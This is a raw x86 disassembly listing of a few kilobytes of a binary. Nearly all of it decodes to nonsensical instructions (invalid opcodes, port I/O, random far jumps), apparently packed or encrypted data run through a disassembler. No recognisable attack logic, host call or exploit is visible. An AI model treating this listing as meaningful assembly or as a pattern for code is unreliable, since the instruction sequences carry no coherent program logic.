  41edbb:	ins    DWORD PTR es:[edi],dx
  41edbc:	mov    ebx,0x577eb729
  41edc1:	sbb    ah,dh
  41edc3:	pop    ebx
  41edc4:	inc    esi
  41edc5:	test   BYTE PTR [esi+0x6a],dh
  41edc8:	pop    ebx
  41edc9:	shrd   DWORD PTR [eax-0x47],esi,0x42
  41edce:	ror    BYTE PTR [esi+0x473269ab],cl
  41edd4:	fdivr  QWORD PTR [ebx-0x72]
  41edd7:	mov    dh,0xb8
  41edd9:	rol    BYTE PTR [esi-0xe41f6ae],0xff
  41ede0:	push   cs
  41ede1:	mov    ebx,ds
  41ede3:	add    eax,0x10031202
  41ede8:	data16 scas al,BYTE PTR es:[edi]
  41edea:	inc    edx
  41edeb:	gs dec esi
  41eded:	scas   eax,DWORD PTR es:[edi]
  41edee:	mov    eax,0x5c11e6b4
  41edf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edf4:	mov    WORD PTR [ebp-0x1],ss
  41edf7:	mov    esi,0xe469b1f7
  41edfc:	mul    DWORD PTR [edx+ebp*1]
  41edff:	mov    edi,0xcf6a19a8
  41ee04:	(bad)  
  41ee05:	xor    DWORD PTR [ebp*4+0x4465e1d4],edx
  41ee0c:	(bad)  
  41ee0d:	jmp    0x41ed9a
  41ee0f:	pop    esi
  41ee10:	rcl    DWORD PTR [esp+edi*2-0x2],1
  41ee14:	jp     0x41ee2a
  41ee16:	cld    
  41ee17:	pop    ds
  41ee18:	cmp    eax,0xbe82d59f
  41ee1d:	out    dx,al
  41ee1e:	mov    eax,0x79a3249e
  41ee23:	or     dh,ah
  41ee25:	in     al,dx
  41ee26:	imul   edx,edi,0x19f4bbdc
  41ee2c:	sbb    dl,BYTE PTR [ecx-0x37]
  41ee2f:	push   ss
  41ee30:	mov    bl,0x8e
  41ee32:	mov    esp,esi
  41ee34:	js     0x41ee3c
  41ee36:	retf   0xa43e
  41ee39:	lock (bad) 
  41ee3b:	je     0x41edd7
  41ee3d:	mov    eax,ds:0x97842f34
  41ee42:	mov    dl,0xec
  41ee44:	shl    DWORD PTR [edi+0x73],cl
  41ee47:	mov    dl,0x54
  41ee49:	xchg   edx,eax
  41ee4a:	loopne 0x41ede6
  41ee4c:	mov    dh,0x1f
  41ee4e:	push   cs
  41ee4f:	imul   edi,DWORD PTR [edx-0x4f05f451],0x56
  41ee56:	or     al,0x15
  41ee59:	inc    ecx
  41ee5a:	outs   dx,DWORD PTR ds:[esi]
  41ee5b:	imul   eax,DWORD PTR [esi+0x55468730],0x6269615
  41ee65:	cmp    BYTE PTR [edx],bl
  41ee67:	lds    edi,FWORD PTR [ebx]
  41ee69:	sbb    bl,BYTE PTR [ebp-0x1bbf0dfc]
  41ee6f:	ret    0xd064
  41ee72:	fidiv  DWORD PTR ds:0x4eac5ae9
  41ee78:	pop    edi
  41ee79:	sub    al,0x2d
  41ee7b:	or     eax,0xae164ada
  41ee80:	ja     0x41eeb6
  41ee82:	das    
  41ee83:	aaa    
  41ee84:	mov    bh,0x1a
  41ee86:	call   ecx
  41ee88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee89:	in     eax,0x6d
  41ee8b:	add    eax,0xfc3fadab
  41ee90:	out    0xee,al
  41ee92:	loopne 0x41ee47
  41ee94:	mov    cl,0x20
  41ee96:	test   DWORD PTR [esi-0x611a3c43],ebp
  41ee9c:	test   eax,0x74b7212
  41eea1:	sbb    al,0xa6
  41eea3:	xchg   DWORD PTR [edi],eax
  41eea5:	cs pop eax
  41eea7:	and    esi,DWORD PTR [eax]
  41eea9:	cmp    al,0x65
  41eeab:	or     al,0x5
  41eead:	les    edx,FWORD PTR ds:0xe1c20f59
  41eeb3:	or     ebp,eax
  41eeb5:	stc    
  41eeb6:	xchg   esi,ebx
  41eeb8:	pop    eax
  41eeb9:	dec    ebp
  41eeba:	shl    DWORD PTR [esi-0x35],1
  41eebd:	mov    edx,0x3c0a4681
  41eec2:	es add edx,ecx
  41eec5:	xor    DWORD PTR [esi],0x1f830ec8
  41eecb:	add    cl,BYTE PTR [edi-0x22380e8]
  41eed1:	mov    DWORD PTR [ebx+0x7a],0x6139d238
  41eed8:	lods   eax,DWORD PTR ds:[esi]
  41eed9:	imul   edi,DWORD PTR [edx],0x79
  41eedc:	cmp    cl,BYTE PTR [edi+eiz*1-0x195d83a7]
  41eee3:	dec    BYTE PTR [ebp+0x4c1430a0]
  41eee9:	jecxz  0x41ee9e
  41eeeb:	(bad)  
  41eeec:	pusha  
  41eeed:	lahf   
  41eeee:	jmp    0x41ee7a
  41eef0:	nop
  41eef1:	jg     0x41ee8c
  41eef3:	test   edx,0xc55ae785
  41eef9:	imul   ebx,DWORD PTR [edx+0x6e],0x786967f6
  41ef00:	mov    bh,0xca
  41ef02:	sub    eax,0x37a77975
  41ef07:	and    eax,0xcc533ba
  41ef0c:	push   ebp
  41ef0d:	cs sbb eax,0x1c9538cd
  41ef13:	lods   al,BYTE PTR ds:[esi]
  41ef14:	hlt    
  41ef15:	push   cs
  41ef16:	dec    ebx
  41ef17:	cli    
  41ef18:	mov    ss,WORD PTR [esi]
  41ef1a:	push   edx
  41ef1b:	into   
  41ef1c:	ss cmp eax,0x3e5a0ece
  41ef22:	push   ss
  41ef23:	mov    edi,DWORD PTR [ecx]
  41ef25:	pop    esi
  41ef26:	(bad)  
  41ef27:	hlt    
  41ef28:	(bad)  
  41ef29:	aam    0x36
  41ef2b:	enter  0xe052,0x6
  41ef2f:	push   es
  41ef30:	ja     0x41ef50
  41ef32:	mov    edx,0x71a57d79
  41ef37:	int3   
  41ef38:	sbb    ch,BYTE PTR [esi-0x62]
  41ef3b:	pop    edx
  41ef3c:	(bad)  
  41ef3e:	adc    eax,0x5c8e0f50
  41ef43:	ficom  WORD PTR [ecx+0x7c398cdd]
  41ef49:	push   0xfffffff5
  41ef4b:	sbb    eax,0x40371856
  41ef50:	into   
  41ef51:	push   ebp
  41ef52:	gs add esi,edx
  41ef55:	cmp    BYTE PTR [ecx+edi*4],0xa7
  41ef59:	out    dx,al
  41ef5a:	ficomp DWORD PTR [edi-0x78242de5]
  41ef60:	outs   dx,BYTE PTR ds:[esi]
  41ef61:	fucomi st,st(2)
  41ef63:	inc    esi
  41ef64:	xchg   esi,eax
  41ef65:	sub    DWORD PTR [ecx-0x43],ecx
  41ef68:	aas    
  41ef69:	mov    ds:0xbf6dcc82,eax
  41ef6e:	or     cl,BYTE PTR [edx]
  41ef70:	push   eax
  41ef71:	mov    edi,0x5dc3b65c
  41ef76:	shl    DWORD PTR [edx-0x4],1
  41ef79:	test   al,0x6b
  41ef7b:	cmp    esi,DWORD PTR ds:[edx+0x5c]
  41ef7f:	leave  
  41ef80:	sub    al,al
  41ef82:	and    al,0x0
  41ef84:	or     dl,BYTE PTR [ecx]
  41ef86:	test   al,0x4f
  41ef88:	lods   eax,DWORD PTR ds:[esi]
  41ef89:	pop    es
  41ef8a:	shl    DWORD PTR [eax],1
  41ef8c:	adc    BYTE PTR [ebp-0x7e],0x8a
  41ef90:	(bad)  
  41ef91:	xor    ch,bl
  41ef93:	and    al,0x83
  41ef95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef96:	add    ah,BYTE PTR [edx]
  41ef98:	lods   eax,DWORD PTR ds:[esi]
  41ef99:	cmp    bl,ah
  41ef9b:	xor    ecx,0xada1e29c
  41efa1:	and    dl,BYTE PTR [esi+ebx*4]
  41efa4:	mov    dh,BYTE PTR [esi]
  41efa6:	int3   
  41efa7:	ja     0x41efd2
  41efa9:	xchg   edx,eax
  41efaa:	mov    WORD PTR [eax],?
  41efac:	cmc    
  41efad:	xor    ah,BYTE PTR [esp+edi*8]
  41efb0:	(bad)  
  41efb1:	lock pop ebp
  41efb3:	mov    DWORD PTR [edx+0x35],ebp
  41efb6:	lock lock ins BYTE PTR es:[edi],dx
  41efb9:	in     al,dx
  41efba:	mov    ch,0x2d
  41efbc:	int    0x5a
  41efbe:	jne    0x41efcf
  41efc0:	xor    ecx,esi
  41efc2:	dec    ebx
  41efc3:	(bad)  
  41efc4:	mov    ds:0x4c6305c8,al
  41efc9:	jae    0x41efed
  41efcb:	push   0xffffffb9
  41efcd:	jns    0x41f031
  41efcf:	hlt    
  41efd0:	mov    cl,0x44
  41efd2:	or     edx,DWORD PTR [eax+ecx*4]
  41efd5:	xchg   ebx,eax
  41efd6:	shl    DWORD PTR [esi],cl
  41efd8:	mov    bh,BYTE PTR [ebp-0x1525650e]
  41efde:	cmp    eax,0xdce49ac1
  41efe3:	xchg   DWORD PTR [edi+0x478d5337],ecx
  41efe9:	jbe    0x41f04a
  41efeb:	jl     0x41eff7
  41efed:	leave  
  41efee:	call   0x8709:0x56610a48
  41eff5:	scas   eax,DWORD PTR es:[edi]
  41eff6:	loopne 0x41ef93
  41eff8:	mov    bh,0x7e
  41effa:	vminss xmm1,xmm7,DWORD PTR [ecx]
  41effe:	pop    esi
  41efff:	clc    
  41f000:	add    esi,DWORD PTR [edx+0x20]
  41f003:	icebp  
  41f004:	jno    0x41f026
  41f006:	sbb    ebx,eax
  41f008:	inc    esp
  41f009:	sbb    BYTE PTR [esi],0xf0
  41f00c:	xor    BYTE PTR [eax-0x8],0xb4
  41f010:	(bad)  
  41f011:	rcr    DWORD PTR [edx],cl
  41f013:	sub    dl,dh
  41f015:	(bad)  
  41f016:	jp     0x41efb4
  41f018:	adc    al,0xca
  41f01a:	mov    ds:0xda3b8a31,eax
  41f01f:	jmp    0x41f531
  41f024:	(bad)  
  41f025:	ret    0xd1c2
  41f028:	fcmovbe st,st(1)
  41f02a:	aad    0xc9
  41f02c:	fs pop esp
  41f02e:	inc    esi
  41f02f:	mov    bl,cl
  41f031:	push   0x45c957c7
  41f036:	jg     0x41f0b0
  41f038:	jae    0x41f0b6
  41f03a:	js     0x41f0b4
  41f03c:	jb     0x41efde
  41f03e:	push   ebx
  41f03f:	in     al,0xa9
  41f041:	std    
  41f042:	dec    edx
  41f043:	lods   al,BYTE PTR ds:[esi]
  41f044:	inc    edx
  41f045:	ud0    esp,DWORD PTR [ebp+ebx*8-0x8e9977e]
  41f04d:	ret    
  41f04e:	pop    ss
  41f04f:	jo     0x41f096
  41f051:	mov    eax,0xd875ab96
  41f056:	pop    edx
  41f057:	int3   
  41f058:	cli    
  41f059:	ret    
  41f05a:	and    DWORD PTR ds:0x607d4585,esp
  41f060:	in     eax,0x67
  41f062:	push   0xcb6137a4
  41f067:	adc    al,0x36
  41f069:	add    eax,0x22fbaa5c
  41f06e:	or     DWORD PTR ds:0x57f03909,esi
  41f074:	inc    ebp
  41f075:	add    DWORD PTR [ebx-0x6b7f9b8d],esp
  41f07b:	jp     0x41f0cf
  41f07d:	inc    eax
  41f07e:	push   edi
  41f07f:	mov    cl,0xd3
  41f081:	jmp    0xf981f0b7
  41f086:	(bad)  
  41f087:	jmp    0x41f09f
  41f089:	push   edx
  41f08a:	jo     0x41f10b
  41f08c:	les    esp,FWORD PTR [edi+0x18]
  41f08f:	(bad)
  41f094:	je     0x41f026
  41f096:	in     al,dx
  41f097:	push   ds
  41f098:	push   esp
  41f099:	sbb    dh,dl
  41f09b:	push   ebx
  41f09c:	push   ebx
  41f09d:	mov    ah,0x30
  41f09f:	mov    ecx,0x3d99f18
  41f0a4:	test   BYTE PTR [edx-0x4c],cl
  41f0a7:	out    0x49,eax
  41f0a9:	xor    al,0xdf
  41f0ab:	arpl   WORD PTR [edi-0x4c6a84aa],bx
  41f0b1:	push   esi
  41f0b2:	jmp    0x8472:0xb1058cd8
  41f0b9:	xchg   edi,eax
  41f0ba:	leave  
  41f0bb:	ins    DWORD PTR es:[edi],dx
  41f0bc:	pop    edi
  41f0bd:	mov    cl,0xaf
  41f0bf:	ja     0x41f044
  41f0c1:	xor    edx,edx
  41f0c3:	sbb    ah,BYTE PTR [ebp-0x2e73eebd]
  41f0c9:	mov    ds:0x9c485bc0,al
  41f0ce:	inc    esp
  41f0cf:	inc    ebx
  41f0d0:	adc    ecx,DWORD PTR [ecx-0x614dbfd4]
  41f0d6:	jbe    0x41f076
  41f0d8:	jno    0x41f0b7
  41f0da:	das    
  41f0db:	stos   DWORD PTR es:[edi],eax
  41f0dc:	aaa    
  41f0dd:	sub    al,0x71
  41f0df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0e0:	in     al,0xb7
  41f0e2:	or     DWORD PTR [edi],edx
  41f0e4:	mov    db7,ebp
  41f0e7:	retf   0xd4e9
  41f0ea:	popa   
  41f0eb:	xchg   ebp,eax
  41f0ec:	lods   eax,DWORD PTR gs:[esi]
  41f0ee:	js     0x41f0c3
  41f0f0:	xor    ch,dh
  41f0f2:	lods   eax,DWORD PTR ds:[esi]
  41f0f3:	xchg   ebx,eax
  41f0f4:	adc    eax,esp
  41f0f6:	inc    esi
  41f0f7:	pop    edx
  41f0f8:	xchg   ecx,eax
  41f0f9:	fdiv   st,st(2)
  41f0fb:	mov    ebx,0x7c5a2c51
  41f100:	pushf  
  41f101:	add    eax,0x93e83cb0
  41f106:	stos   BYTE PTR es:[edi],al
  41f107:	pop    eax
  41f108:	loop   0x41f092
  41f10a:	clc    
  41f10b:	cwde   
  41f10c:	inc    ebx
  41f10d:	pop    es
  41f10e:	or     bh,BYTE PTR [edi+0x37896ba8]
  41f114:	pop    esp
  41f115:	jg     0x41f0ae
  41f117:	iret   
  41f118:	shl    BYTE PTR [eax],1
  41f11a:	xchg   BYTE PTR [ebx+0x56],cl
  41f11d:	in     eax,0x57
  41f11f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f120:	test   BYTE PTR [edi+0x2d],ch
  41f123:	aam    0xf6
  41f125:	inc    edi
  41f126:	push   edi
  41f127:	jge    0x41f156
  41f129:	shl    edi,0x65
  41f12c:	mov    esp,0x8b4d586c
  41f131:	adc    BYTE PTR [edi],bh
  41f133:	loopne 0x41f0d8
  41f135:	xchg   ebp,eax
  41f136:	and    ecx,DWORD PTR [edi]
  41f138:	sub    ch,BYTE PTR [ecx-0x51b6e091]
  41f13e:	pushf  
  41f13f:	cwde   
  41f140:	test   BYTE PTR [edi-0x63],0x79
  41f144:	imul   esi,DWORD PTR [edx-0xee0fda9],0xb7dcbb5
  41f14e:	jmp    0x41f14e
  41f150:	dec    ecx
  41f151:	(bad)  
  41f152:	bound  edx,QWORD PTR [ecx-0x18]
  41f155:	gs cld 
  41f157:	xchg   esi,eax
  41f158:	sbb    al,0x9b
  41f15a:	aam    0xc9
  41f15c:	cs pop edi
  41f15e:	push   0xffffffc2
  41f160:	adc    cl,BYTE PTR [edx*8+0x42489228]
  41f167:	std    
  41f168:	dec    eax
  41f169:	cmc    
  41f16a:	gs push edx
  41f16c:	repnz sub al,0xa3
  41f16f:	bound  ebp,QWORD PTR ds:0x12bbdfd1
  41f175:	fimul  WORD PTR [edi-0x7e]
  41f178:	jmp    0x41f131
  41f17a:	mov    eax,0xf48c71c
  41f17f:	mov    ds:0x216ecb00,al
  41f184:	iret   
  41f185:	cmp    eax,0x7c4c2ad9
  41f18a:	sub    eax,DWORD PTR [eax+0x10d7f2ca]
  41f190:	and    DWORD PTR [edi-0xc7f10ab],eax
  41f196:	mov    edi,esp
  41f198:	ins    DWORD PTR es:[edi],dx
  41f199:	push   edi
  41f19a:	push   0x25a3dfc3
  41f19f:	and    ebx,esp
  41f1a1:	push   es
  41f1a2:	pop    edi
  41f1a3:	(bad)  
  41f1a4:	sub    eax,0x8a95b152
  41f1a9:	(bad)  
  41f1aa:	pop    edx
  41f1ab:	jnp    0x41f15d
  41f1ad:	aam    0xbc
  41f1af:	out    dx,al
  41f1b0:	not    ch
  41f1b2:	push   eax
  41f1b3:	cmp    DWORD PTR [eax],esp
  41f1b5:	jmp    0x75784255
  41f1ba:	pop    ds
  41f1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1bc:	(bad)  
  41f1bd:	mov    ecx,DWORD PTR [edx]
  41f1bf:	out    0x62,al
  41f1c1:	push   ds
  41f1c2:	fldcw  WORD PTR ds:0xf2f87a6
  41f1c8:	test   al,0xb4
  41f1ca:	pop    eax
  41f1cb:	out    0xe7,eax
  41f1cd:	xchg   ebx,eax
  41f1ce:	mov    bh,0x8f
  41f1d0:	pop    ds
  41f1d1:	cli    
  41f1d2:	mov    bh,0xb9
  41f1d4:	aas    
  41f1d5:	(bad)  
  41f1d6:	xor    DWORD PTR [esi-0x49d860c1],edi
  41f1dc:	loope  0x41f191
  41f1de:	jnp    0x41f16d
  41f1e0:	push   edx
  41f1e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1e2:	jge    0x41f227
  41f1e4:	cmp    bh,al
  41f1e6:	sbb    eax,0x452c179
  41f1eb:	seto   BYTE PTR [ecx-0x17bd5863]
  41f1f2:	or     ch,BYTE PTR [eax]
  41f1f4:	repnz add al,0xda
  41f1f7:	jmp    0x41f195
  41f1f9:	in     al,0x54
  41f1fb:	setbe  ch
  41f1fe:	aad    0x16
  41f200:	icebp  
  41f201:	dec    edx
  41f202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f203:	xor    bl,BYTE PTR [esi]
  41f205:	pop    esp
  41f206:	dec    eax
  41f207:	ror    BYTE PTR [esi+0xdc92676],cl
  41f20d:	enter  0xfbb,0x60
  41f211:	in     al,0x8e
  41f213:	test   BYTE PTR [edx+0x675fd84f],0x80
  41f21a:	xor    edi,ecx
  41f21c:	rcl    esp,0xb4
  41f21f:	jbe    0x41f266
  41f221:	data16 add al,0x37
  41f224:	iret   
  41f225:	pop    edi
  41f226:	pop    edx
  41f227:	mov    edi,0x253d4b5b
  41f22c:	inc    ebx
  41f22d:	ss push ebx
  41f22f:	cmp    DWORD PTR [ebx-0x76],edi
  41f232:	outs   dx,BYTE PTR ds:[esi]
  41f233:	bnd jp 0x41f1d2
  41f236:	lods   al,BYTE PTR ds:[esi]
  41f237:	or     eax,0x73601c6c
  41f23c:	aad    0x56
  41f23e:	and    bl,BYTE PTR [edx-0x8]
  41f241:	loop   0x41f1c5
  41f243:	(bad)  
  41f244:	popf   
  41f245:	adc    BYTE PTR [edi+0x2d7c4d5],0x90
  41f24c:	test   al,0x41
  41f24e:	mov    ebx,0x58ee5931
  41f253:	loop   0x41f200
  41f255:	dec    esi
  41f256:	dec    edx
  41f257:	xchg   esp,eax
  41f258:	ror    DWORD PTR [ebx-0x2f8ca9b4],cl
  41f25e:	push   eax
  41f25f:	ret    
  41f260:	sti    
  41f261:	out    dx,eax
  41f262:	lock jno 0x41f29e
  41f265:	mov    ebp,0xc50c991a
  41f26a:	out    0x85,al
  41f26c:	dec    esp
  41f26d:	mov    ch,BYTE PTR [ecx+ecx*4+0x63e08de8]
  41f274:	stos   DWORD PTR es:[edi],eax
  41f275:	push   ds
  41f276:	jmp    0x4b70f294
  41f27b:	and    al,0xa2
  41f27d:	push   edx
  41f27e:	add    esi,DWORD PTR [ebp+0xf011d6e]
  41f284:	lods   al,BYTE PTR ds:[esi]
  41f285:	mov    esi,0xc47c4a39
  41f28a:	ficomp DWORD PTR ds:0xa6a3893c
  41f290:	scas   al,BYTE PTR es:[edi]
  41f291:	call   0xcfa690eb
  41f296:	je     0x41f2f8
  41f298:	js     0x41f275
  41f29a:	(bad)  
  41f29b:	mov    dh,0xd3
  41f29d:	fsubr  DWORD PTR fs:[ebx-0x2a]
  41f2a1:	or     ebx,eax
  41f2a3:	mov    bl,0x35
  41f2a5:	jge    0x41f23c
  41f2a7:	std    
  41f2a8:	xor    eax,DWORD PTR [ecx-0x14]
  41f2ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2ac:	adc    ebp,DWORD PTR gs:[edi]
  41f2af:	imul   ebx,DWORD PTR [ebx-0x598ffa86],0x5
  41f2b6:	cld    
  41f2b7:	push   ss
  41f2b8:	aas    
  41f2b9:	(bad)  [edx]
  41f2bb:	jg     0x41f285
  41f2bd:	out    dx,al
  41f2be:	adc    al,0x58
  41f2c0:	mov    eax,0xf9e324af
  41f2c5:	inc    eax
  41f2c6:	adc    eax,0x9ebffb47
  41f2cb:	and    eax,0x70fd21a4
  41f2d0:	retf   
  41f2d1:	mov    eax,0xa36f3dab
  41f2d6:	out    dx,al
  41f2d7:	pop    ebp
  41f2d8:	fwait
  41f2d9:	ret    0x8ab3
  41f2dc:	add    eax,0xdce60e49
  41f2e1:	test   DWORD PTR [ebx-0x1cefde8],ecx
  41f2e7:	mov    esp,ebp
  41f2e9:	push   es
  41f2ea:	and    DWORD PTR [ebx-0x41],ecx
  41f2ed:	icebp  
  41f2ee:	and    ebx,DWORD PTR [eax-0xb3debac]
  41f2f4:	push   DWORD PTR [ebx]
  41f2f6:	imul   ebx,DWORD PTR [esi+0x3d972ae6],0x2b6b245e
  41f300:	push   edi
  41f301:	xchg   ebp,eax
  41f302:	or     DWORD PTR [esp+esi*2-0x73],esp
  41f306:	xor    DWORD PTR [ebp-0x48],edi
  41f309:	ja     0x41f32f
  41f30b:	add    cl,bl
  41f30d:	(bad)  
  41f30f:	call   0x39d9:0x792335a6
  41f316:	cmp    dh,al
  41f318:	mov    es,esp
  41f31a:	or     esp,DWORD PTR [edx+0x40]
  41f31d:	cmp    al,0x70
  41f31f:	inc    eax
  41f320:	xor    BYTE PTR ds:0xed667d4c,bh
  41f326:	pushf  
  41f327:	add    bh,al
  41f329:	addr16 mov edx,0x616e3844
  41f32f:	xchg   ebx,eax
  41f330:	popf   
  41f331:	jl     0x41f349
  41f333:	es int 0x40
  41f336:	cmp    eax,0x41809ad4
  41f33b:	ds out 0x65,al
  41f33e:	enter  0x3721,0xda
  41f342:	mov    ebx,0x75eb310e
  41f347:	rcr    DWORD PTR ds:0xcb96ef90,1
  41f34d:	lods   al,BYTE PTR ds:[esi]
  41f34e:	push   ebx
  41f34f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f350:	inc    ebp
  41f351:	push   esi
  41f352:	jp     0x41f2ef
  41f354:	shr    bl,1
  41f356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f357:	or     eax,ebx
  41f359:	shr    bh,1
  41f35b:	aaa    
  41f35c:	inc    ebp
  41f35d:	fsub   QWORD PTR ds:0xbaeefb25
  41f363:	pop    ebp
  41f364:	dec    ebx
  41f365:	leave  
  41f366:	add    ebp,DWORD PTR [edi+0x2d806f9d]
  41f36c:	sbb    eax,DWORD PTR [esi-0xe]
  41f36f:	sahf   
  41f370:	in     eax,dx
  41f371:	mov    bl,0x9b
  41f373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f374:	out    dx,al
  41f375:	push   ss
  41f376:	inc    eax
  41f377:	mov    ch,0x80
  41f379:	outs   dx,DWORD PTR ds:[esi]
  41f37a:	lods   al,BYTE PTR ds:[esi]
  41f37b:	cmp    ah,dl
  41f37d:	dec    esi
  41f37e:	adc    eax,0x442b4307
  41f383:	fimul  WORD PTR [esi-0x27c34211]
  41f389:	dec    ecx
  41f38a:	jnp    0x41f35e
  41f38c:	fist   DWORD PTR [edi]
  41f38e:	cld    
  41f38f:	retf   0x900
  41f392:	pop    ecx
  41f393:	cmp    DWORD PTR [edx],0x83268011
  41f399:	(bad)  
  41f39b:	jo     0x41f3f1
  41f39d:	xchg   edx,eax
  41f39e:	xor    BYTE PTR [esi-0x2b],0x8b
  41f3a2:	xchg   ebp,eax
  41f3a3:	mov    ecx,0x73666bef
  41f3a8:	cs aam 0xcb
  41f3ab:	pop    es
  41f3ac:	bound  edx,QWORD PTR [ebx-0x4f]
  41f3af:	push   eax
  41f3b0:	cs int 0xfd
  41f3b3:	mov    cl,0xe
  41f3b5:	jbe    0x41f352
  41f3b7:	mov    bh,0xec
  41f3b9:	int3   
  41f3ba:	mov    cl,0x9e
  41f3bc:	je     0x41f3fc
  41f3be:	pop    esp
  41f3bf:	mov    esp,0xd0ab2e3e
  41f3c4:	ja     0x41f415
  41f3c6:	stc    
  41f3c7:	mov    ecx,eax
  41f3c9:	ret    0x9318
  41f3cc:	dec    eax
  41f3cd:	push   ds
  41f3ce:	adc    eax,0x909efba5
  41f3d3:	xchg   ecx,eax
  41f3d4:	clc    
  41f3d5:	xchg   ecx,eax
  41f3d6:	push   ebp
  41f3d7:	in     al,dx
  41f3d8:	lods   eax,DWORD PTR ds:[esi]
  41f3d9:	push   es
  41f3da:	xchg   DWORD PTR [ecx],edx
  41f3dc:	xor    eax,0x215396b0
  41f3e1:	mov    DWORD PTR [ecx-0xd],0xcd141b76
  41f3e8:	jb     0x41f3d8
  41f3ea:	or     esp,esi
  41f3ec:	aad    0xa1
  41f3ee:	int    0xf4
  41f3f0:	mov    ebp,0xf74ecac5
  41f3f5:	sar    BYTE PTR [eax],cl
  41f3f7:	fcomp  QWORD PTR [eax+eiz*2+0x2ec8ec66]
  41f3fe:	xor    esi,esp
  41f400:	ins    BYTE PTR es:[edi],dx
  41f401:	jb     0x41f3d3
  41f403:	pop    ecx
  41f404:	ins    BYTE PTR es:[edi],dx
  41f405:	cs jbe 0x41f3aa
  41f408:	std    
  41f409:	xor    edx,DWORD PTR [esi]
  41f40b:	dec    edi
  41f40c:	dec    esp
  41f40d:	jns    0x41f3e8
  41f40f:	sub    edx,DWORD PTR [ebx]
  41f411:	mov    edi,0x5e48f998
  41f416:	dec    edx
  41f417:	lock add eax,0x14fb9e6d
  41f41d:	dec    eax
  41f41e:	mov    esp,0x54e3b879
  41f423:	test   eax,0x4e360705
  41f428:	add    BYTE PTR [esi-0x57ea6a31],cl
  41f42e:	gs (bad) 
  41f430:	adc    eax,0x9c0c247c
  41f435:	hlt    
  41f436:	cld    
  41f437:	add    eax,0x6bb847d5
  41f43c:	jne    0x41f460
  41f43e:	jb     0x41f3f3
  41f440:	mov    dl,0xf4
  41f442:	sbb    esp,ebp
  41f444:	shl    BYTE PTR [eax],1
  41f446:	aam    0x77
  41f448:	xor    al,0x1d
  41f44a:	push   ebx
  41f44b:	jns    0x41f488
  41f44d:	test   eax,0xca290d9
  41f452:	sbb    DWORD PTR [edi+0x6a],eax
  41f455:	pusha  
  41f456:	push   ss
  41f457:	in     eax,dx
  41f458:	adc    bh,BYTE PTR [ecx+0x723ec555]
  41f45e:	cmp    DWORD PTR [edi-0x421868ee],0x8f9d942d
  41f468:	pop    ecx
  41f469:	push   edx
  41f46a:	pop    ebp
  41f46b:	and    eax,0x9fbd5b8b
  41f470:	dec    eax
  41f471:	sbb    eax,0x8455fce1
  41f476:	cmp    edi,edi
  41f478:	(bad)  
  41f479:	adc    esi,DWORD PTR [edi]
  41f47b:	sbb    al,BYTE PTR [eax-0x33]
  41f47e:	mov    eax,ds:0x6f252c79
  41f483:	loope  0x41f454
  41f485:	push   esp
  41f486:	out    0x8c,al
  41f488:	inc    ebp
  41f489:	and    eax,0x9e8d81cf
  41f48e:	inc    esi
  41f48f:	mov    ds:0x9e238b6e,eax
  41f494:	lds    esp,FWORD PTR [ebx+0x7c]
  41f497:	test   eax,0x905f4712
  41f49c:	push   ss
  41f49d:	aam    0x4f
  41f49f:	jns    0x41f482
  41f4a1:	ins    BYTE PTR es:[edi],dx
  41f4a2:	adc    dl,bl
  41f4a4:	jle    0x41f469
  41f4a6:	inc    edi
  41f4a7:	or     al,0x66
  41f4a9:	mov    eax,0x3c9b4908
  41f4ae:	pushf  
  41f4af:	inc    edx
  41f4b0:	sahf   
  41f4b1:	add    eax,0xea520c6f
  41f4b6:	jge    0x41f534
  41f4b8:	sahf   
  41f4b9:	outs   dx,DWORD PTR ds:[esi]
  41f4ba:	out    0x28,eax
  41f4bc:	mov    eax,0xb1994950
  41f4c1:	mov    ds:0x19a318c,al
  41f4c6:	dec    ebx
  41f4c7:	adc    ch,BYTE PTR [eax+0x660d54b1]
  41f4cd:	ds jg  0x41f48c
  41f4d0:	and    eax,0xdc5f9024
  41f4d5:	pop    edi
  41f4d6:	out    dx,eax
  41f4d7:	outs   dx,BYTE PTR ds:[esi]
  41f4d8:	push   ebx
  41f4d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4da:	fst    QWORD PTR [edi+ebx*4]
  41f4dd:	jne    0x41f4cd
  41f4df:	add    DWORD PTR [ecx+ebx*8-0x7598428b],esi
  41f4e6:	mov    cl,0x15
  41f4e8:	pop    edx
  41f4e9:	leave  
  41f4ea:	mov    esi,0x6518d4b4
  41f4ef:	push   cs
  41f4f0:	jle    0x41f571
  41f4f2:	adc    dh,BYTE PTR [ecx+ebx*8-0x3f]
  41f4f6:	add    DWORD PTR [edx+0x23],0x87dca715
  41f4fd:	push   0x47
  41f4ff:	ins    BYTE PTR es:[edi],dx
  41f500:	add    eax,0xde056992
  41f505:	push   esp
  41f506:	mov    ah,ah
  41f508:	or     dl,dl
  41f50a:	push   ecx
  41f50b:	dec    edi
  41f50c:	popf   
  41f50d:	xchg   ebp,eax
  41f50e:	int    0x48
  41f510:	push   cs
  41f511:	aas    
  41f512:	or     eax,0x8566eafd
  41f517:	sbb    ebx,DWORD PTR [ecx+edi*2-0x7d]
  41f51b:	imul   ebx,DWORD PTR cs:[ebx+eax*8-0x63],0xcf27c4f9
  41f524:	cli    
  41f525:	xlat   BYTE PTR ds:[ebx]
  41f526:	sbb    eax,0xcdef43d9
  41f52b:	mov    ebx,0x8c9841f2
  41f530:	imul   ecx,DWORD PTR [edi],0xffffff87
  41f533:	or     BYTE PTR [eax],al
  41f535:	add    BYTE PTR [eax],al
  41f537:	mov    edx,DWORD PTR [ebp-0x28]
  41f53a:	jmp    0x422873
  41f53f:	mov    edx,DWORD PTR [ebp-0x30]
  41f542:	mov    edi,DWORD PTR [ebp-0x4]
  41f545:	xor    edx,eax
